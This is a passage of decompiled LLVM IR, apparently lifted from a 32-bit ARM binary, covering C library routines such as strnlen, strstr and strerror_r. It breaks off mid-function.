  %v4_140cc = inttoptr i32 %v3_140cc to i8*
  store i8 %v3_140c4, i8* %v4_140cc, align 1
  %v5_140cc = load i32, i32* %ip.global-to-local, align 4
  %v6_140cc = add i32 %v5_140cc, 1
  store i32 %v6_140cc, i32* %ip.global-to-local, align 4
  %v0_140d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_140d0 = add i32 %v0_140d0, 1
  store i32 %v1_140d0, i32* %r1.global-to-local, align 4
  %v0_140d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140d4, label %dec_label_pc_140fc, label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140c4
  %v1_140d8 = add i32 %v0_140d0, 2
  %v2_140d8 = inttoptr i32 %v1_140d8 to i8*
  %v3_140d8 = load i8, i8* %v2_140d8, align 1
  %v4_140d8 = zext i8 %v3_140d8 to i32
  store i32 %v4_140d8, i32* %r3.global-to-local, align 4
  %v2_140dc = icmp eq i8 %v3_140d8, 0
  store i1 %v2_140dc, i1* %cpsr_z.global-to-local, align 1
  %v3_140e0 = add i32 %v5_140cc, 2
  %v4_140e0 = inttoptr i32 %v3_140e0 to i8*
  store i8 %v3_140d8, i8* %v4_140e0, align 1
  %v5_140e0 = load i32, i32* %ip.global-to-local, align 4
  %v6_140e0 = add i32 %v5_140e0, 1
  store i32 %v6_140e0, i32* %ip.global-to-local, align 4
  %v0_140e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_140e4 = add i32 %v0_140e4, 1
  store i32 %v1_140e4, i32* %r1.global-to-local, align 4
  %v0_140e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140e8, label %dec_label_pc_140fc, label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140d8
  %v0_140ec = load i32, i32* @lr, align 4
  %v1_140ec = add i32 %v0_140ec, -1
  store i32 %v1_140ec, i32* @lr, align 4
  %v7_140ec = icmp eq i32 %v0_140ec, 1
  store i1 %v7_140ec, i1* %cpsr_z.global-to-local, align 1
  %v1_140f0 = add i32 %v0_140e4, 2
  store i32 %v1_140f0, i32* @r1, align 4
  br i1 %v7_140ec, label %dec_label_pc_14110, label %dec_label_pc_140a0

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140d8, %dec_label_pc_140c4, %dec_label_pc_140b0, %dec_label_pc_140a0
  %v1_140fc = phi i32 [ %v6_140e0, %dec_label_pc_140d8 ], [ %v6_140cc, %dec_label_pc_140c4 ], [ %v6_140b8, %dec_label_pc_140b0 ], [ %v6_140a8, %dec_label_pc_140a0 ]
  %v2_140fc1 = sub i32 %arg1, %v1_140fc
  %v2_14100 = add i32 %v2_140fc1, %arg2
  store i32 %v2_14100, i32* %r3.global-to-local, align 4
  %v1_14104 = add i32 %v2_14100, -1
  store i32 %v1_14104, i32* %r2.global-to-local, align 4
  %v7_14104 = icmp eq i32 %v2_14100, 1
  store i1 %v7_14104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14104, label %bb, label %dec_label_pc_14130

bb:                                               ; preds = %dec_label_pc_140fc
  ret i32 %arg1

dec_label_pc_14110:                               ; preds = %dec_label_pc_140ec, %entry
  %v2_141206 = phi i32 [ %v1_14094, %entry ], [ %v6_140e0, %dec_label_pc_140ec ]
  %v1_14110 = urem i32 %arg2, 4
  store i32 %v1_14110, i32* %r2.global-to-local, align 4
  %v2_14110 = icmp eq i32 %v1_14110, 0
  store i1 %v2_14110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14110, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_14110
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_14110, %._crit_edge
  %v2_14120 = phi i32 [ %v6_14120, %._crit_edge ], [ %v2_141206, %dec_label_pc_14110 ]
  %v0_1411c = phi i32 [ %v0_1411c.pre, %._crit_edge ], [ %v1_14110, %dec_label_pc_14110 ]
  %v0_14118 = load i32, i32* @r1, align 4
  %v1_14118 = inttoptr i32 %v0_14118 to i8*
  %v2_14118 = load i8, i8* %v1_14118, align 1
  %v3_14118 = zext i8 %v2_14118 to i32
  store i32 %v3_14118, i32* %r3.global-to-local, align 4
  %v5_14118 = add i32 %v0_14118, 1
  store i32 %v5_14118, i32* @r1, align 4
  %v1_1411c = add i32 %v0_1411c, -1
  store i32 %v1_1411c, i32* %r2.global-to-local, align 4
  %v7_1411c = icmp eq i32 %v0_1411c, 1
  store i1 %v7_1411c, i1* %cpsr_z.global-to-local, align 1
  %v3_14120 = add i32 %v2_14120, 1
  %v4_14120 = inttoptr i32 %v3_14120 to i8*
  store i8 %v2_14118, i8* %v4_14120, align 1
  %v5_14120 = load i32, i32* %ip.global-to-local, align 4
  %v6_14120 = add i32 %v5_14120, 1
  store i32 %v6_14120, i32* %ip.global-to-local, align 4
  %v0_14124 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14124, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_14128 = load i32, i32* %r3.global-to-local, align 4
  %v2_14128 = icmp eq i32 %v0_14128, 0
  store i1 %v2_14128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14128, label %dec_label_pc_14130, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_1411c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_14130:                               ; preds = %dec_label_pc_140fc, %bb13, %dec_label_pc_14130
  %v2_14138 = phi i32 [ %v6_14138, %dec_label_pc_14130 ], [ %v1_140fc, %dec_label_pc_140fc ], [ %v6_14120, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14134 = load i32, i32* %r2.global-to-local, align 4
  %v1_14134 = add i32 %v0_14134, -1
  store i32 %v1_14134, i32* %r2.global-to-local, align 4
  %v7_14134 = icmp eq i32 %v0_14134, 1
  store i1 %v7_14134, i1* %cpsr_z.global-to-local, align 1
  %v3_14138 = add i32 %v2_14138, 1
  %v4_14138 = inttoptr i32 %v3_14138 to i8*
  store i8 0, i8* %v4_14138, align 1
  %v5_14138 = load i32, i32* %ip.global-to-local, align 4
  %v6_14138 = add i32 %v5_14138, 1
  store i32 %v6_14138, i32* %ip.global-to-local, align 4
  %v0_1413c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1413c, label %dec_label_pc_14140, label %dec_label_pc_14130

dec_label_pc_14140:                               ; preds = %dec_label_pc_14130
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_14138, { 1, 0 }
  uselistorder i32 %v0_14134, { 1, 0 }
  uselistorder i32 %v6_14120, { 0, 2, 1 }
  uselistorder i32 %v1_14110, { 2, 1, 0 }
  uselistorder i32 %v2_14100, { 2, 1, 0 }
  uselistorder i32 %v1_140f0, { 1, 0 }
  uselistorder i32 %v0_140ec, { 1, 0 }
  uselistorder i32 %v6_140e0, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 4, 5, 2, 0, 3 }
  uselistorder label %dec_label_pc_14130, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14144 = load i32, i32* @r1, align 4
  %v2_14144 = icmp eq i32 %v0_14144, 0
  br i1 %v2_14144, label %bb, label %dec_label_pc_14174

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14184
  %v3_1415c = icmp uge i32 %v5_14210, %v1_1415c
  %v9_1415c = icmp eq i32 %v5_14210, %v1_1415c
  %v2_14160 = xor i1 %v3_1415c, true
  %v3_14160 = or i1 %v9_1415c, %v2_14160
  br i1 %v3_14160, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_1415c
  %v6_14160 = sub i32 %v5_14210, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1415c, %bb19
  %v5_14164 = phi i32 [ %v1_1415c, %dec_label_pc_1415c ], [ %v6_14160, %bb19 ]
  %v2_14164 = xor i1 %v9_1415c, true
  %v3_14164 = and i1 %v3_1415c, %v2_14164
  br i1 %v3_14164, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_14164 = sub i32 %v5_14164, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_14168 = phi i32 [ %v5_14164, %bb20 ], [ %v6_14164, %bb21 ]
  ret i32 %v8_14168

dec_label_pc_1416c:                               ; preds = %dec_label_pc_141b8
  br label %dec_label_pc_1420c

dec_label_pc_14174:                               ; preds = %entry
  %v2_14174 = add i32 %tmp, %v0_14144
  %v3_14174 = icmp ult i32 %v2_14174, %tmp
  br i1 %v3_14174, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_14174
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_14174, %bb23
  %v5_14210 = phi i32 [ %v2_14174, %dec_label_pc_14174 ], [ -1, %bb23 ]
  %v1_141942 = urem i32 %tmp, 4
  %v2_141943 = icmp eq i32 %v1_141942, 0
  br i1 %v2_141943, label %dec_label_pc_1419c, label %dec_label_pc_14184

dec_label_pc_14184:                               ; preds = %bb24, %dec_label_pc_14190
  %v1_1415c = phi i32 [ %v1_14190, %dec_label_pc_14190 ], [ %tmp, %bb24 ]
  %v1_14184 = inttoptr i32 %v1_1415c to i8*
  %v2_14184 = load i8, i8* %v1_14184, align 1
  %v2_14188 = icmp eq i8 %v2_14184, 0
  br i1 %v2_14188, label %dec_label_pc_1415c, label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14184
  %v1_14190 = add i32 %v1_1415c, 1
  %v1_14194 = urem i32 %v1_14190, 4
  %v2_14194 = icmp eq i32 %v1_14194, 0
  br i1 %v2_14194, label %dec_label_pc_1419c, label %dec_label_pc_14184

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14190, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_14190, %dec_label_pc_14190 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_141fc32 = icmp ult i32 %storemerge.lcssa, %v5_14210
  br i1 %v3_141fc32, label %dec_label_pc_141a4, label %dec_label_pc_1420c

dec_label_pc_141a4:                               ; preds = %dec_label_pc_141f8, %dec_label_pc_1419c
  %v0_1416c39 = phi i32 [ %v4_141a4, %dec_label_pc_141f8 ], [ %storemerge.lcssa, %dec_label_pc_1419c ]
  %v1_141a4 = inttoptr i32 %v0_1416c39 to i32*
  %v2_141a4 = load i32, i32* %v1_141a4, align 4
  %v4_141a4 = add i32 %v0_1416c39, 4
  store i32 %v4_141a4, i32* @lr, align 4
  %v2_141a8 = add i32 %v2_141a4, -16843009
  %v2_141ac = and i32 %v2_141a8, -2139062144
  %v2_141b0 = icmp eq i32 %v2_141ac, 0
  br i1 %v2_141b0, label %dec_label_pc_141f8, label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141a4
  %v2_141b8 = inttoptr i32 %v0_1416c39 to i8*
  %v3_141b8 = load i8, i8* %v2_141b8, align 1
  %v2_141c0 = icmp eq i8 %v3_141b8, 0
  %v1_141c4 = add i32 %v0_1416c39, 1
  br i1 %v2_141c0, label %dec_label_pc_1416c, label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141b8
  %v2_141cc = inttoptr i32 %v1_141c4 to i8*
  %v3_141cc = load i8, i8* %v2_141cc, align 1
  %v2_141d0 = icmp eq i8 %v3_141cc, 0
  br i1 %v2_141d0, label %dec_label_pc_1420c, label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141cc
  %v1_141d8 = add i32 %v0_1416c39, 2
  %v2_141d8 = inttoptr i32 %v1_141d8 to i8*
  %v3_141d8 = load i8, i8* %v2_141d8, align 1
  %v2_141dc = icmp eq i8 %v3_141d8, 0
  br i1 %v2_141dc, label %dec_label_pc_1420c, label %dec_label_pc_141e8

dec_label_pc_141e8:                               ; preds = %dec_label_pc_141d8
  %v1_141e8 = add i32 %v0_1416c39, 3
  %v2_141e8 = inttoptr i32 %v1_141e8 to i8*
  %v3_141e8 = load i8, i8* %v2_141e8, align 1
  %v2_141ec = icmp eq i8 %v3_141e8, 0
  br i1 %v2_141ec, label %dec_label_pc_1420c, label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141e8, %dec_label_pc_141a4
  %v3_141fc = icmp ult i32 %v4_141a4, %v5_14210
  br i1 %v3_141fc, label %dec_label_pc_141a4, label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %dec_label_pc_141f8, %dec_label_pc_1419c, %dec_label_pc_141cc, %dec_label_pc_141d8, %dec_label_pc_141e8, %dec_label_pc_1416c
  %v1_1420c = phi i32 [ %v0_1416c39, %dec_label_pc_1416c ], [ %storemerge.lcssa, %dec_label_pc_1419c ], [ %v1_141c4, %dec_label_pc_141cc ], [ %v1_141d8, %dec_label_pc_141d8 ], [ %v1_141e8, %dec_label_pc_141e8 ], [ %v5_14210, %dec_label_pc_141f8 ]
  %v3_1420c = icmp uge i32 %v5_14210, %v1_1420c
  %v9_1420c = icmp eq i32 %v5_14210, %v1_1420c
  %v2_14210 = xor i1 %v3_1420c, true
  %v3_14210 = or i1 %v9_1420c, %v2_14210
  br i1 %v3_14210, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1420c
  %v6_14210 = sub i32 %v5_14210, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1420c, %bb25
  %v5_14214 = phi i32 [ %v1_1420c, %dec_label_pc_1420c ], [ %v6_14210, %bb25 ]
  %v2_14214 = xor i1 %v9_1420c, true
  %v3_14214 = and i1 %v3_1420c, %v2_14214
  br i1 %v3_14214, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_14214 = sub i32 %v5_14214, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_14218 = phi i32 [ %v5_14214, %bb26 ], [ %v6_14214, %bb27 ]
  ret i32 %v8_14218

; uselistorder directives
  uselistorder i1 %v3_1420c, { 1, 0 }
  uselistorder i32 %v4_141a4, { 1, 2, 0 }
  uselistorder i32 %v0_1416c39, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14190, { 1, 0, 2 }
  uselistorder i32 %v1_1415c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_14210, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_1415c, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1420c, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_14184, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_14224 = load i32, i32* @r5, align 4
  %v9_14224 = load i32, i32* @r6, align 4
  %v3_14228 = load i8, i8* %arg2, align 1
  %v2_1422c = icmp eq i8 %v3_14228, 0
  br i1 %v2_1422c, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_14234 = add i32 %arg1, -1
  br label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_14244, %bb50
  %v0_14238 = phi i32 [ %v1_14238, %dec_label_pc_14244 ], [ %v1_14234, %bb50 ]
  %v1_14238 = add i32 %v0_14238, 1
  %v2_14238 = inttoptr i32 %v1_14238 to i8*
  %v3_14238 = load i8, i8* %v2_14238, align 1
  %v2_1423c = icmp eq i8 %v3_14238, 0
  br i1 %v2_1423c, label %dec_label_pc_14314, label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %dec_label_pc_14238
  %v9_14244 = icmp eq i8 %v3_14238, %v3_14228
  br i1 %v9_14244, label %dec_label_pc_1424c, label %dec_label_pc_14238

dec_label_pc_1424c:                               ; preds = %dec_label_pc_14244
  %v2_1424c = add i32 %tmp, 1
  %v3_1424c = inttoptr i32 %v2_1424c to i8*
  %v4_1424c = load i8, i8* %v3_1424c, align 1
  %v2_14250 = icmp eq i8 %v4_1424c, 0
  br i1 %v2_14250, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_1424c
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_14238

bb52:                                             ; preds = %dec_label_pc_1424c
  %v1_1425c = add i32 %v0_14238, 2
  %v1_142b0 = add i32 %tmp, 2
  %v2_142b0 = inttoptr i32 %v1_142b0 to i8*
  br label %dec_label_pc_142a8

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14308
  %v3_1426c = load i8, i8* %v3_142a0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_14298.preheader

dec_label_pc_14298.preheader:                     ; preds = %dec_label_pc_1426c, %dec_label_pc_142a8
  %v0_142984.in = phi i8 [ %v3_1426c, %dec_label_pc_1426c ], [ %v3_142a0.pn, %dec_label_pc_142a8 ]
  %v9_1429813 = icmp eq i8 %v0_142984.in, %v3_14228
  br i1 %v9_1429813, label %dec_label_pc_142a0, label %dec_label_pc_14278

dec_label_pc_14278:                               ; preds = %dec_label_pc_14298.preheader, %dec_label_pc_14294
  %v0_14280 = phi i32 [ %v1_14294, %dec_label_pc_14294 ], [ %storemerge43, %dec_label_pc_14298.preheader ]
  %v0_14278.in = phi i8 [ %v3_14294, %dec_label_pc_14294 ], [ %v0_142984.in, %dec_label_pc_14298.preheader ]
  %v2_14278 = icmp eq i8 %v0_14278.in, 0
  br i1 %v2_14278, label %dec_label_pc_14314, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14278
  %v1_14280 = add i32 %v0_14280, 1
  %v2_14280 = inttoptr i32 %v1_14280 to i8*
  %v3_14280 = load i8, i8* %v2_14280, align 1
  store i32 %v1_14280, i32* @ip, align 4
  %v9_14284 = icmp eq i8 %v3_14280, %v3_14228
  br i1 %v9_14284, label %dec_label_pc_142a0, label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14280
  %v2_1428c = icmp eq i8 %v3_14280, 0
  br i1 %v2_1428c, label %dec_label_pc_14314, label %dec_label_pc_14294

dec_label_pc_14294:                               ; preds = %dec_label_pc_1428c
  %v1_14294 = add i32 %v0_14280, 2
  %v2_14294 = inttoptr i32 %v1_14294 to i8*
  %v3_14294 = load i8, i8* %v2_14294, align 1
  store i32 %v1_14294, i32* @ip, align 4
  %v9_14298 = icmp eq i8 %v3_14294, %v3_14228
  br i1 %v9_14298, label %dec_label_pc_142a0, label %dec_label_pc_14278

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14280, %dec_label_pc_14294, %dec_label_pc_14298.preheader
  %v0_142a0 = phi i32 [ %storemerge43, %dec_label_pc_14298.preheader ], [ %v1_14280, %dec_label_pc_14280 ], [ %v1_14294, %dec_label_pc_14294 ]
  %v1_142a0 = add i32 %v0_142a0, 1
  br label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %bb52, %dec_label_pc_142a0
  %storemerge43 = phi i32 [ %v1_142a0, %dec_label_pc_142a0 ], [ %v1_1425c, %bb52 ]
  %v3_142a0.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_142a0.pn = load i8, i8* %v3_142a0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_142a0.pn, %v4_1424c
  br i1 %storemerge, label %dec_label_pc_142ac, label %dec_label_pc_14298.preheader

dec_label_pc_142ac:                               ; preds = %dec_label_pc_142a8
  %v1_142ac = add i32 %storemerge43, 1
  %v2_142ac = inttoptr i32 %v1_142ac to i8*
  %v3_142ac = load i8, i8* %v2_142ac, align 1
  %v4_142ac = zext i8 %v3_142ac to i32
  %v3_142b0 = load i8, i8* %v2_142b0, align 1
  %v4_142b0 = zext i8 %v3_142b0 to i32
  %v1_142b4 = add i32 %storemerge43, -1
  %v9_142b8 = icmp eq i8 %v3_142ac, %v3_142b0
  store i32 %v1_142b0, i32* @lr, align 4
  store i32 %v1_142ac, i32* @ip, align 4
  br i1 %v9_142b8, label %dec_label_pc_142c8, label %dec_label_pc_14308

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142ac, %dec_label_pc_142c4
  %v0_142e0 = phi i32 [ %v1_142e8, %dec_label_pc_142c4 ], [ %v1_142b0, %dec_label_pc_142ac ]
  %v0_142d8 = phi i32 [ %v1_142e4, %dec_label_pc_142c4 ], [ %v1_142ac, %dec_label_pc_142ac ]
  %v0_142c8 = phi i32 [ %v4_142f8, %dec_label_pc_142c4 ], [ %v4_142ac, %dec_label_pc_142ac ]
  %v2_142c8 = icmp eq i32 %v0_142c8, 0
  br i1 %v2_142c8, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_142c8
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_142b4

bb54:                                             ; preds = %dec_label_pc_142c8
  %v1_142d0 = add i32 %v0_142d8, 1
  %v2_142d0 = inttoptr i32 %v1_142d0 to i8*
  %v3_142d0 = load i8, i8* %v2_142d0, align 1
  %v1_142d4 = add i32 %v0_142e0, 1
  %v2_142d4 = inttoptr i32 %v1_142d4 to i8*
  %v3_142d4 = load i8, i8* %v2_142d4, align 1
  %v4_142d4 = zext i8 %v3_142d4 to i32
  store i32 %v1_142d0, i32* @r1, align 4
  %v9_142dc = icmp eq i8 %v3_142d0, %v3_142d4
  %v1_142e4 = add i32 %v0_142d8, 2
  store i32 %v1_142e4, i32* @ip, align 4
  %v1_142e8 = add i32 %v0_142e0, 2
  store i32 %v1_142e8, i32* @lr, align 4
  br i1 %v9_142dc, label %dec_label_pc_142f0, label %dec_label_pc_14308

dec_label_pc_142f0:                               ; preds = %bb54
  %v2_142f0 = icmp eq i8 %v3_142d0, 0
  br i1 %v2_142f0, label %bb55, label %dec_label_pc_142c4

bb55:                                             ; preds = %dec_label_pc_142f0
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_142b4

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142f0
  %v2_142f8 = inttoptr i32 %v1_142e8 to i8*
  %v3_142f8 = load i8, i8* %v2_142f8, align 1
  %v4_142f8 = zext i8 %v3_142f8 to i32
  %v2_142fc = inttoptr i32 %v1_142e4 to i8*
  %v3_142fc = load i8, i8* %v2_142fc, align 1
  %v9_14300 = icmp eq i8 %v3_142fc, %v3_142f8
  br i1 %v9_14300, label %dec_label_pc_142c8, label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_142c4, %bb54, %dec_label_pc_142ac
  %v0_14308 = phi i32 [ %v4_142b0, %dec_label_pc_142ac ], [ %v4_142f8, %dec_label_pc_142c4 ], [ %v4_142d4, %bb54 ]
  %v2_14308 = icmp eq i32 %v0_14308, 0
  br i1 %v2_14308, label %dec_label_pc_14310, label %dec_label_pc_1426c

dec_label_pc_14310:                               ; preds = %dec_label_pc_14308
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_142b4

dec_label_pc_14314:                               ; preds = %dec_label_pc_14238, %dec_label_pc_1428c, %dec_label_pc_14278
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_142e8, { 0, 2, 1 }
  uselistorder i32 %v1_142e4, { 1, 2, 0 }
  uselistorder i32 %v1_142b4, { 2, 1, 0 }
  uselistorder i8 %v3_142a0.pn, { 1, 0 }
  uselistorder i8* %v3_142a0.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_14294, { 1, 0 }
  uselistorder i32 %v1_14294, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14238, { 0, 2, 1 }
  uselistorder i8 %v3_14228, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_14224, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_14224, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14314, { 1, 2, 0 }
  uselistorder label %dec_label_pc_142c8, { 1, 0 }
  uselistorder label %dec_label_pc_142a8, { 1, 0 }
  uselistorder label %dec_label_pc_142a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14278, { 1, 0 }
  uselistorder label %dec_label_pc_14298.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14324 = call i32 @__xpg_strerror_r()
  %v0_14328 = load i32, i32* @r4, align 4
  ret i32 %v0_14328
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_14330 = load i32, i32* @r4, align 4
  %v0_14334 = load i32, i32* @r0, align 4
  %v0_14340 = load i32, i32* @r1, align 4
  store i32 %v0_14340, i32* @r8, align 4
  %v0_14344 = load i32, i32* @r2, align 4
  store i32 %v0_14344, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_14334, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_1437c

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_23368.1111 to i32), i32* @r5, align 4
  %v2_143643446 = icmp eq i32 %v0_14334, 0
  br i1 %v2_143643446, label %bb26, label %dec_label_pc_14358.lr.ph

dec_label_pc_14358:                               ; preds = %dec_label_pc_14358.lr.ph, %bb
  %v2_1437041 = phi i1 [ %v2_143703849, %dec_label_pc_14358.lr.ph ], [ %v2_14370, %bb ]
  %v1_1437440 = phi i32 [ %v0_14364.pr48, %dec_label_pc_14358.lr.ph ], [ %v2_14360, %bb ]
  %v0_1435c39 = phi i32 [ %v0_14368547, %dec_label_pc_14358.lr.ph ], [ %v1_1435c, %bb ]
  %v1_1435c = add i32 %v0_1435c39, 1
  store i32 %v1_1435c, i32* @r5, align 4
  br i1 %v2_1437041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_14358
  %v2_14360 = add i32 %v1_1437440, -1
  %v2_14364 = icmp eq i32 %v2_14360, 0
  %v1_14368 = inttoptr i32 %v1_1435c to i8*
  %v2_14368 = load i8, i8* %v1_14368, align 1
  %v2_14370 = icmp eq i8 %v2_14368, 0
  br i1 %v2_14364, label %dec_label_pc_14370, label %dec_label_pc_14358

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_14358
  %v1_1436835 = inttoptr i32 %v1_1435c to i8*
  %v2_1436836 = load i8, i8* %v1_1436835, align 1
  %v2_1437038 = icmp eq i8 %v2_1436836, 0
  br label %dec_label_pc_14358.lr.ph

dec_label_pc_14358.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_143703849 = phi i1 [ %v2_1437038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_14364.pr48 = phi i32 [ %v1_1437440, %thread-pre-split.loopexit ], [ %v0_14334, %thread-pre-split.preheader ]
  %v0_14368547 = phi i32 [ %v1_1435c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_23368.1111 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_14358

dec_label_pc_14370:                               ; preds = %bb
  br i1 %v2_14370, label %dec_label_pc_1437c, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_14370
  %v0_1435c.lcssa55 = phi i32 [ %v1_1435c, %dec_label_pc_14370 ], [ ptrtoint ([8 x i8]* @global_var_23368.1111 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_143b0

dec_label_pc_1437c:                               ; preds = %dec_label_pc_14370, %entry
  %v3_14380 = ashr i32 %v0_14334, 31
  %v5_14394 = bitcast i32* %stack_var_-25 to i8*
  %v6_14394 = call i32 @_uintmaxtostr(i8* %v5_14394, i32 %v0_14334, i32 %v3_14380, i32 -10, i32 0)
  %v1_14398 = add i32 %v6_14394, -14
  store i32 %v1_14398, i32* @r5, align 4
  store i32 %v1_14398, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_23358.1113 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_143a8 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_143b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %bb26, %dec_label_pc_1437c
  %v0_143b0 = phi i32 [ %v0_1435c.lcssa55, %bb26 ], [ %v0_143b0.pre, %dec_label_pc_1437c ]
  %v1_143b0 = inttoptr i32 %v0_143b0 to i8*
  %v3_143b4 = call i32 @strlen(i8* %v1_143b0)
